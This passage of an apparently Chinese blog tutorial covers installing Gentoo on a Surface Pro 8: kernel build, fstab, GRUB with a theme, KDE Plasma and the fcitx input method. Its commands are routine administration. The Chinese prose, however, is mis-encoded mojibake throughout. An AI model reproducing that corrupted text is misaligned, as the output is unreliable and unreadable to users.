<code>/usr/src/linux</code>ï¼Œåœ¨ Gentoo ä¸‹æˆ‘ä»¬é€šè¿‡å¦‚ä¸‹å‘½ä»¤æ‰‹åŠ¨åˆ›å»ºï¼ˆåºå·ç”± <code>eselect</code> å‘½ä»¤è·å¾—ï¼‰ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">eselect kernel <span class="hljs-built_in">set</span> 1</span><br></code></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥åˆ›å»ºé…ç½®æ–‡ä»¶ <code>.config</code> ï¼Œè¿™é‡Œç¬”è€…ä½¿ç”¨é»˜è®¤çš„ <code>make defconfig</code> ï¼Œä½ ä¹Ÿå¯ä»¥ä½¿ç”¨ <code>make localmodconfig</code> æ¥æ£€æµ‹ç¡¬ä»¶å¹¶å†³å®šå¼€å¯çš„å†…æ ¸æ¨¡å—ï¼Œæ ¹æ®è‡ªå·±çš„éœ€æ±‚è¿›è¡Œé€‰æ‹©å³å¯ï¼š</p><blockquote><p>å†…æ ¸æ¨¡å—ä¼šç‹¬ç«‹å­˜åœ¨ï¼Œå¦‚æœä½ æƒ³è®©å†…æ ¸æ¨¡å—è¢«ç¼–è¯‘åˆ° vmlinuz ä¸­ï¼Œä½¿ç”¨ <code>localyesconfig</code> ï¼Œå¦‚æœä½ æƒ³è¦å¼€å¯å°½å¯èƒ½å¤šçš„ç¼–è¯‘é€‰é¡¹ï¼Œå¯ä»¥é€‰æ‹© <code>allyesconfig</code> æˆ– <code>allmodconfig</code> </p><blockquote><p> æ­¤å¤–ï¼Œé›†æˆåˆ°å†…æ ¸ä¸­çš„å†…æ ¸æ¨¡å—å¯èƒ½ä¼šæœ‰ç‚¹å°é—®é¢˜ï¼ˆä¾‹å¦‚ç¬”è€…æ›¾ç»ç¢°åˆ°è¿‡ Intel ç½‘å¡é©±åŠ¨ç‹¬ç«‹å­˜åœ¨å¯ä»¥æ­£å¸¸å­˜æ´»ä½†é›†æˆåˆ°å†…æ ¸ä¸­ä¾¿æ— æ³•æ­£å¸¸å·¥ä½œçš„æƒ…å†µï¼‰</p></blockquote></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">cd</span> /usr/src/linux</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">make defconfig</span><br></code></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥ç”¨ menuconfig æ‰‹åŠ¨æ”¹ä¸€äº›é€‰é¡¹ï¼Œå…¶ä¼šåœ¨å·²æœ‰çš„ <code>.config</code> åŸºç¡€ä¸Šè¿›è¡Œä¿®æ”¹ï¼Œè¿™é‡Œæˆ‘ä»¬è¦å†³å®šçš„åŒ…æ‹¬ OpenRC&#x2F;systemd çš„é€‰æ‹©ã€å¸¸ç”¨æ–‡ä»¶ç³»ç»Ÿæ”¯æŒã€é¢å¤–é€‰ä¸€äº› Surface ç›¸å…³çš„é©±åŠ¨ç­‰ï¼Œå…·ä½“å‚è§ <a href="https://wiki.gentoo.org/wiki/Handbook:AMD64/Installation/Kernel#Alternative:_Manual_configuration">Gentoo handbook</a>ï¼š</p><blockquote><p>åœ¨è¿™ä¸€æ­¥ï¼Œä½ å¯èƒ½ä¼šéœ€è¦æ‰‹åŠ¨å¼€å¯ iwlwifi çš„ç¼–è¯‘æ”¯æŒï¼Œå‚è§ <a href="https://wiki.gentoo.org/wiki/Iwlwifi">Gentoo wiki - iwlwifi</a> çš„ <code>Device driver wilwifi</code>  ä¸€èŠ‚</p><p>åœ¨è¿™ä¸€æ­¥ï¼Œä½ è¿˜å¯èƒ½ä¼šéœ€è¦æ‰‹åŠ¨å°†ç½‘å¡å›ºä»¶æ·»åŠ åˆ°é…ç½®ä¸­ï¼Œå‚è§ <a href="https://wiki.gentoo.org/wiki/Iwlwifi">Gentoo wiki - iwlwifi</a> çš„ <code>Firmware</code>  ä¸€èŠ‚<a href="https://wiki.gentoo.org/wiki/Iwlwifi">https://wiki.gentoo.org/wiki/Iwlwifi</a>)</p><blockquote><p>å¦‚æœä¸æ¸…æ¥šåº”è¯¥æ·»åŠ å“ªä¸ªå›ºä»¶ï¼Œå¯ä»¥ <code>dmesg | grep -i wifi | grep -i ucode</code> æŸ¥çœ‹åœ¨ LiveISO å½“ä¸­ä½¿ç”¨çš„æ˜¯å“ªä¸ª</p></blockquote></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">make menuconfig</span><br></code></pre></td></tr></table></figure><p>ç„¶åå¼€å§‹ç¼–è¯‘å†…æ ¸ï¼Œè¿™å¯èƒ½ä¼šéœ€è¦ä¸€å®šçš„æ—¶é—´ï¼š</p><blockquote><p>å®é™…ä¸Šåœ¨ç¬”è€…çš„æœºå™¨ä¸Š 8 åˆ†é’Ÿå·¦å³å°±èƒ½å®Œæˆäº†ï¼Œç¬”è€…ä¹Ÿæ²¡æƒ³åˆ° <code>1135g7</code> çš„æ€§èƒ½è¿™ä¹ˆå¼ºï¼Œå¯èƒ½è¿™å°±æ˜¯ç§‘æŠ€çš„è¿›æ­¥å§ ï¼šï¼‰</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">make -j$(<span class="hljs-built_in">nproc</span>) &amp;&amp; make modules_install -j$(<span class="hljs-built_in">nproc</span>)</span><br></code></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥ä½¿ç”¨ <a href="https://wiki.gentoo.org/wiki/Installkernel">installkernel</a> å®‰è£…å†…æ ¸ï¼Œè¿™é‡Œç¬”è€…é€‰æ‹©ä½¿ç”¨ <code>GRUB + systemd</code> ï¼Œé¦–å…ˆåˆ›å»ºæ–‡ä»¶ <code>/etc/portage/package.use/installkernel</code> å¹¶å†™å…¥ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sys-kernel/installkernel grub dracut<br></code></pre></td></tr></table></figure><p>ç„¶åè¿è¡Œï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">emerge --ask sys-kernel/installkernel</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">make install</span><br></code></pre></td></tr></table></figure><h2 id="é…ç½®ç³»ç»Ÿ"><a href="#é…ç½®ç³»ç»Ÿ" class="headerlink" title="é…ç½®ç³»ç»Ÿ"></a>é…ç½®ç³»ç»Ÿ</h2><p>é¦–å…ˆé…ç½® <code>/etc/fstab</code> ï¼Œè¿™ä¸ªæ–‡ä»¶å†³å®šäº†åœ¨ç³»ç»Ÿå¯åŠ¨æ—¶å“ªäº›åˆ†åŒºè¯¥è¢«æŒ‚è½½åˆ°å“ªäº›ç›®å½•ï¼Œä¸ºäº†ä¿è¯æŒ‚è½½çš„ä¸€è‡´æ€§ï¼Œé€šå¸¸æˆ‘ä»¬ä¼šé€‰æ‹©ä½¿ç”¨ä¸€ä¸ªåˆ†åŒºçš„ UUID è¿›è¡ŒæŒ‚è½½ï¼Œè€Œéè®¾å¤‡è·¯å¾„ï¼Œå› ä¸ºåœ¨æœ‰ç€å¤šä¸ªç£ç›˜çš„ç¯å¢ƒä¸­ä¸åŒç£ç›˜çš„è·¯å¾„åœ¨å¯åŠ¨åæœªå¿…ä¸€è‡´</p><blockquote><p>ä¸è¿‡å› ä¸ºç¬”è€…çš„ Surface Pro 8 ä»…æœ‰ä¸€ä¸ªç›˜ä½ï¼Œæ‰€ä»¥æ˜¯å¯ä»¥ä½¿ç”¨è®¾å¤‡è·¯å¾„è¿›è¡ŒæŒ‚è½½çš„ï¼Œä½†ä¿é™©èµ·è§è¿˜æ˜¯ç”¨ UUID è¿›è¡ŒæŒ‚è½½</p></blockquote><p>é¦–å…ˆæŸ¥çœ‹ä¸åŒåˆ†åŒºçš„ UUIDï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">blkid</span><br></code></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥æŒ‰ç…§åˆ†åŒºç”¨é€”ç¼–å†™ fstabï¼Œä»¥ç¬”è€…çš„é…ç½®ä¸ºä¾‹ï¼š</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">UUID</span>=f0e95c49-e05d-<span class="hljs-number">4659</span>-a617-bfdaee35af7c none       swap  sw           <span class="hljs-number">0</span> <span class="hljs-number">0</span><br><span class="hljs-attribute">UUID</span>=<span class="hljs-number">8317</span>cece-<span class="hljs-number">8</span>c46-<span class="hljs-number">4</span>fec-bdf6-ddab4aa23249 /          ext4  defaults     <span class="hljs-number">0</span> <span class="hljs-number">1</span><br><span class="hljs-attribute">UUID</span>=<span class="hljs-number">5</span>e8624e3-b40e-<span class="hljs-number">4</span>e6c-be02-e72a99e94462 /home      ext4  data=ordered <span class="hljs-number">0</span> <span class="hljs-number">2</span><br><span class="hljs-attribute">UUID</span>=C215-<span class="hljs-number">9</span>C27                            /boot/efi  vfat  utf8         <span class="hljs-number">0</span> <span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><p>ç„¶åé…ç½®ä¸»æœºåï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Surface-Pro-8&quot;</span> &gt; /etc/hostname</span><br></code></pre></td></tr></table></figure><p>é…ç½® DHCPï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">emerge --ask net-misc/dhcpcd</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">systemctl <span class="hljs-built_in">enable</span> dhcpcd</span><br></code></pre></td></tr></table></figure><p>è®¾ç½® root å¯†ç ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">passwd</span><br></code></pre></td></tr></table></figure><p>åˆå§‹åŒ–ä¸€äº›é…ç½®ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">systemd-machine-id-setup</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">systemd-firstboot --prompt</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">systemctl preset-all --preset-mode=enable-only</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">systemctl preset-all</span><br></code></pre></td></tr></table></figure><blockquote><p>ï¼ˆå¯é€‰ï¼‰é…ç½®æ–‡ä»¶ç´¢å¼•</p><p>é€šè¿‡ç©ºé—´æ¢æ—¶é—´çš„æ–¹å¼åŠ å¿«æ–‡ä»¶æœç´¢é€Ÿåº¦ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">emerge --ask sys-apps/mlocate</span><br></code></pre></td></tr></table></figure></blockquote><p>é…ç½® shell è‡ªåŠ¨è¡¥å…¨ï¼Œgentoo é»˜è®¤ä½¿ç”¨ bashï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">emerge --ask app-shells/bash-completion</span><br></code></pre></td></tr></table></figure><p>é…ç½®æ—¶é—´åŒæ­¥ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">emerge --ask net-misc/chrony</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">systemctl <span class="hljs-built_in">enable</span> chronyd.service</span><br></code></pre></td></tr></table></figure><p>é…ç½®æ–‡ä»¶ç³»ç»Ÿå’Œç£ç›˜ç›¸å…³çš„ä¸€äº›å·¥å…·ï¼Œç¬”è€…åªç”¨ ext4 å’Œ fat32ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">emerge --ask sys-fs/e2fsprogs</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">emerge --ask sys-fs/dosfstools</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">emerge --ask sys-block/io-scheduler-udev-rules</span><br></code></pre></td></tr></table></figure><p>å®‰è£…ç½‘ç»œç›¸å…³çš„ä¸€äº›åŒ…ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">emerge --ask net-dialup/ppp</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">emerge --ask net-wireless/iw net-wireless/wpa_supplicant</span><br></code></pre></td></tr></table></figure><p>å®‰è£… NetworkManagerï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">emerge --ask net-misc/networkmanager</span><br></code></pre></td></tr></table></figure><p>å®Œæˆåæˆ‘ä»¬é€šè¿‡ä¿®æ”¹ <code>/etc/portage/make.conf</code> ä¸­çš„ USE flags æ·»åŠ ç›¸å…³è½¯ä»¶å¯¹ NetworkManager çš„æ”¯æŒï¼š</p><blockquote><p>æ·»åŠ å®Œ USE flags ååˆ«å¿˜äº†é€šè¿‡å¦‚ä¸‹å‘½ä»¤è¿›è¡Œæ›´æ–°ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">emerge --ask --changed-use --deep @world</span><br></code></pre></td></tr></table></figure></blockquote><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">USE</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;$&#123;USE&#125; networkmanager&quot;</span><br></code></pre></td></tr></table></figure><p>å®Œæˆå®‰è£…åå¯ç”¨å¯¹åº”çš„ systemd serviceï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">systemctl <span class="hljs-built_in">enable</span> NetworkManager</span><br></code></pre></td></tr></table></figure><p>å®‰è£… sudo ï¼Œè§£æ³¨é‡Š <code>%wheel ALL=(ALL:ALL) ALL</code> æ‰€åœ¨è¡Œï¼š </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">emerge --ask app-admin/sudo</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">visudo</span><br></code></pre></td></tr></table></figure><p>å‰é¢æˆ‘ä»¬åªé…ç½®äº† root ç”¨æˆ·ï¼Œæ‰€ä»¥åˆ«å¿˜äº†é…ç½®ä¸€ä¸ªæ—¥å¸¸ç”¨çš„ç®¡ç†å‘˜ç”¨æˆ·ï¼š</p><blockquote><p>è¿™é‡Œä¼šæŠ¥ä¸€ä¸ª <code>Creating mailbox file: No such file or directory</code> çš„é”™è¯¯ï¼Œå¯ä»¥ä¸ç”¨ç®¡</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">groupadd arttnba3</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">useradd -g arttnba3 -m -G <span class="hljs-built_in">users</span>,wheel,audio,cdrom,floppy,portage,usb,video -s /bin/bash arttnba3</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">passwd arttnba3</span><br></code></pre></td></tr></table></figure><h2 id="å®‰è£…-boot-loader"><a href="#å®‰è£…-boot-loader" class="headerlink" title="å®‰è£… boot loader"></a>å®‰è£… boot loader</h2><p>æŒ‰æƒ¯ä¾‹ç›´æ¥ç”¨ GRUB å°±è¡Œï¼Œ <del>çœŸçš„ä¼šæœ‰äººå»ç”¨ systemd-boot ğŸ´</del> ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;GRUB_PLATFORMS=&quot;efi-64&quot;&#x27;</span> &gt;&gt; /etc/portage/make.conf</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">emerge --ask --update --newuse --verbose sys-boot/grub</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">emerge --ask sys-boot/os-prober</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">grub-install --target=x86_64-efi --efi-directory=/boot/efi --bootloader-id=Gentoo</span><br></code></pre></td></tr></table></figure><p>é»˜è®¤çš„ grub ä¸»é¢˜æ¯”è¾ƒéš¾çœ‹ï¼Œè€Œä¸”åœ¨é«˜åˆ†è¾¨ç‡å±ä¸‹çœ‹ç€å±å®æœ‰äº›éš¾å—ï¼Œæ‰€ä»¥ç¬”è€…è¿™é‡Œé€‰æ‹©å®‰è£…ä¸€ä¸ª <a href="">minegrub</a> ä¸»é¢˜ï¼Œé¦–å…ˆå…‹éš†ä»“åº“ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">emerge --ask dev-vcs/git</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">cd</span> ~</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">git <span class="hljs-built_in">clone</span> https://github.com/Lxtharia/minegrub-theme.git</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">cd</span> ./minegrub-theme</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">cp</span> -ruv ./minegrub /boot/grub/themes/</span><br></code></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥ä¿®æ”¹ grub é…ç½®æ–‡ä»¶ <code>/etc/default/grub</code>ï¼š</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">GRUB_THEME=<span class="hljs-regexp">/boot/g</span>rub<span class="hljs-regexp">/themes/mi</span>negrub/theme.txt<br></code></pre></td></tr></table></figure><p>æ·»åŠ è‡ªåŠ¨æ›´æ–°èƒŒæ™¯å­—ä½“çš„ systemd æœåŠ¡ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">cp</span> ./minegrub-update.service /etc/systemd/system</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">systemctl <span class="hljs-built_in">enable</span> minegrub-update.service</span><br></code></pre></td></tr></table></figure><p>æœ€åå°† grub é…ç½®å†™å…¥ grub.cfg ä¸­ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">grub-mkconfig -o /boot/grub/grub.cfg</span><br></code></pre></td></tr></table></figure><p>æœ€åé‡å¯ç³»ç»Ÿï¼Œåˆ«å¿˜äº†æ‹” u ç›˜ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">exit</span></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">umount -l /mnt/gentoo/dev&#123;/shm,/pts,&#125;</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">umount -R /mnt/gentoo</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">reboot</span><br></code></pre></td></tr></table></figure><p>è¿›å…¥ç³»ç»Ÿåæˆ‘ä»¬ç”¨ os-probe å®ŒæˆåŒç³»ç»Ÿå¼•å¯¼ä¸­å¯¹ Windows çš„æ£€æµ‹ä»¥åŠ grub entry çš„ç”Ÿæˆï¼ˆå½“ç„¶å¦‚æœä½ æ¯”è¾ƒé—²ä¹Ÿå¯ä»¥æ‰‹å†™ï¼‰ï¼Œè¿™é‡Œåˆ«å¿˜äº†æ£€æŸ¥ <code>/etc/default/grub</code> ä¸­æ˜¯å¦æœ‰ <code>GRUB_DISABLE_OS_PROBER=false</code> ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">grub-mkconfig -o /boot/grub/grub.cfg</span><br></code></pre></td></tr></table></figure><h2 id="å®‰è£…-KDE-Wayland"><a href="#å®‰è£…-KDE-Wayland" class="headerlink" title="å®‰è£… KDE + Wayland"></a>å®‰è£… KDE + Wayland</h2><p>é¦–å…ˆæŒ‰æƒ¯ä¾‹è¿æ¥ç½‘ç»œï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">nmtui</span><br></code></pre></td></tr></table></figure><p>ç„¶åå®‰è£…  <a href="https://packages.gentoo.org/packages/kde-plasma/plasma-meta">kde-plasma&#x2F;plasma-meta</a> å’Œ  <a href="https://packages.gentoo.org/packages/kde-apps/kde-apps-meta">kde-apps&#x2F;kde-apps-meta</a>ï¼Œä¸è¿‡ä¸åŒäºå…¶ä»–çš„æ»šåŠ¨å‘è¡Œç‰ˆï¼ˆArchã€openSUSE Tumbleweedã€Debian Sid ç­‰ï¼‰æˆ–æ˜¯è´´è¿‘ä¸Šæ¸¸çš„å¸¸è§„å‘è¡Œç‰ˆï¼ˆå¦‚ Fedora Spinï¼‰ï¼ŒGentoo æ»šå¾—æ¯”è¾ƒæ…¢ï¼Œç›®å‰ stable åˆ†æ”¯è¿˜åœç•™åœ¨ KDE 5.27ï¼š</p><blockquote><p>å¦‚æœä½ ä¸æƒ³å®‰è£…å…¶ä¸­çš„éƒ¨åˆ†ç»„ä»¶ï¼Œå¯ä»¥éå¸¸è½»æ¾åœ°é€šè¿‡ USE flag è¿›è¡Œå®šä¹‰ï¼Œä¾‹å¦‚ <code>USE=&quot;kde-plasma/plasma-meta -xwayland&quot;</code> å°†ä¸ä¼šå®‰è£… <code>xwayland</code> ï¼Œé€šè¿‡ <code>-sddm</code> flag ä¹Ÿå¯ä»¥å°†é»˜è®¤çš„ sddm æ›¿æ¢ä¸º lightdmï¼Œå¯ç”¨çš„ USE flag è¯¦è§ <a href="https://wiki.gentoo.org/wiki/KDE">Gentoo wiki</a></p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo emerge --ask kde-plasma/plasma-meta</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo emerge --ask kde-apps/kde-apps-meta</span><br></code></pre></td></tr></table></figure><blockquote><p>å¦‚æœä½ å’Œç¬”è€…ä¸€æ ·ä½¿ç”¨ç±»ä¼¼ Surface Pro çš„æ€§èƒ½æ¯”è¾ƒä½ä¸‹çš„ç¬”è®°æœ¬ï¼Œé‚£ä¹ˆè¿™ä¸ªç¼–è¯‘ä¼šè€—è´¹ç›¸å½“é•¿çš„æ—¶é—´ï¼ˆè‡³å°‘æ•°ä¸ªå°æ—¶ï¼‰ï¼Œæ­£æ‰€è°“ <code>â€œä¸€æ¯èŒ¶ï¼Œä¸€åŒ…çƒŸï¼ŒGentooç¼–è¯‘ä¸€æ•´å¤©â€</code> ï¼ˆç¬‘ï¼‰</p></blockquote><p>plasma-meta åŒ…è‡ªå¸¦ä¾èµ– sddm ï¼Œç›´æ¥å¯ç”¨ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo systemctl <span class="hljs-built_in">enable</span> --now sddm.service</span><br></code></pre></td></tr></table></figure><p>æœ€åè¿›å…¥åˆ°å¤§å®¶ç†Ÿæ‚‰çš„ KDE æ¡Œé¢ï¼Œéå¸¸å¥½çš„æ˜¯é»˜è®¤ä½¿ç”¨ waylandï¼Œä½†éå¸¸åçš„æ˜¯ Plasma 6 åœ¨å„å¤§å‘è¡Œç‰ˆéƒ½é“ºå¼€äº†çš„æ—¶å€™ Gentoo è¿™è¾¹è¿˜åœåœ¨ <code>5.27</code> ï¼š</p><p><img src="https://s2.loli.net/2024/05/06/kdpR871gunKx4wt.png"></p><blockquote><p>éœ€è¦æ³¨æ„çš„æ˜¯ Linux on Surface ç”±äºç¼ºå°‘ç›¸åº”çš„è§¦æ‘¸æ¿é©±åŠ¨ï¼Œè§¦æ‘¸æ¿ä½¿ç”¨ä½“éªŒæå…¶ç³Ÿç³•ï¼Œåœ¨ç³»ç»Ÿè®¾ç½®ä¸­ä¹Ÿæ— æ³•è¢«æ£€æµ‹ä¸ºè§¦æ‘¸æ¿</p></blockquote><h2 id="å®‰è£…ä¸­æ–‡å­—ä½“ä¸è¾“å…¥æ³•"><a href="#å®‰è£…ä¸­æ–‡å­—ä½“ä¸è¾“å…¥æ³•" class="headerlink" title="å®‰è£…ä¸­æ–‡å­—ä½“ä¸è¾“å…¥æ³•"></a>å®‰è£…ä¸­æ–‡å­—ä½“ä¸è¾“å…¥æ³•</h2><p>é¦–å…ˆå®‰è£…ä¸­æ–‡å­—ä½“ï¼Œæ¯•ç«Ÿå¤§å®¶éƒ½ä¸å–œæ¬¢çœ‹åˆ°ä¸€å¤§ç‰‡æ–¹å—ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo emerge --ask media-fonts/arphicfonts</span><br></code></pre></td></tr></table></figure><p>ä¸­æ–‡è¾“å…¥æ³•æŒ‰æƒ¯ä¾‹é€‰æ‹©æ¥è‡ª Gentoo ä¸­æ–‡ç¤¾åŒºçš„ fcitx ï¼Œä¸è¿‡é»˜è®¤è¢« masked äº†ï¼Œå¾—å…ˆ unmasked ä¸€ä¸‹ï¼š</p><blockquote><p>å¦‚æœæ²¡æœ‰ï¼Œæ£€æŸ¥ä¸€ä¸‹ä½ çš„ <code>gentoo-zh</code> ä»“åº“æ˜¯å¦å¯ç”¨æˆåŠŸ</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo emerge --ask --autounmask app-i18n/fcitx-meta</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo dispatch-conf <span class="hljs-comment"># è¿™é‡Œç›´æ¥ u å°±å¥½</span></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo emerge --ask app-i18n/fcitx-meta app-i18n/fcitx-chinese-addons</span><br></code></pre></td></tr></table></figure><p>æœ€åæŒ‰æƒ¯ä¾‹åœ¨è®¾ç½®çš„ <code>virtual keyboard</code> é‡Œé€‰ä¸­ <code>fcitx5</code> ï¼Œç„¶åå³é”® panel çš„å°ä¼é¹…å›¾æ ‡æ‰¾ <code>Pinyin</code> å³å¯ï¼š</p><p><img src="https://s2.loli.net/2024/05/08/Fau4LnKdUomslJY.jpg" 